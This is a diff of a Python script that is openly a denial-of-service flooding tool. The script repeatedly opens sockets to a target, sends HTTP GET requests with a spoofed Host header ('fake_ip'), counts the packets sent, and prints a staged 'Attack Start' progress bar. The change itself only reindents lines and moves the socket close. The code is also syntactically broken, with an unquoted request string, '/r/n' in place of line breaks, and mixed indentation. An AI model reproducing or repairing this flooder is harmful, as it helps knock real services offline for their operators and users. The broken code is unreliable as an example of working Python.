@@ -30,27 +30,26 @@ counter = 0
 
 def attack():
     while True:
-       s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-       s.connect((target,port))
-       s.sendto(("GET /"+target+HTTP/1.1/r/n).encode("ascii"),(target,port))
-       s.sendto(("Host:"+fake_ip+"/r/n/r/n").encode("ascii"),(target,port))
-       s.close()
+        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+        s.connect((target,port))
+        s.sendto(("GET /"+target+HTTP/1.1/r/n).encode("ascii"),(target,port))
+        s.sendto(("Host:"+fake_ip+"/r/n/r/n").encode("ascii"),(target,port))
 	
-	global counter
-	counter += 1
-	print(f"packet {str(counter)} sent ! /n")
+        global counter
+        counter += 1
+        print(f"packet {str(counter)} sent ! /n")
+        s.close()
 	
-	
-	print(" [                  ]  0% ")
-	time.sleep(1)
-	print(" [••••••          ]  20% ")
-	time.sleep(1)
-	print(" [•••••••••      ]  60% ")
-	time.sleep(1)
-	print(" [•••••••••••••]  100% ")
-	time.sleep(1)
-	print("Attack Start . . . !")
-	time.sleep(1)
+    	print(" [                 ]  0% ")
+    	time.sleep(1)
+    	print(" [••••••         ]  20% ")
+    	time.sleep(1)
+    	print(" [•••••••••     ]  60% ")
+    	time.sleep(1)
+    	print(" [•••••••••••••]  100% ")
+    	time.sleep(1)
+    	print("Attack Start . . . !")
+    	time.sleep(1)
 	
 	
 for i in range(400):
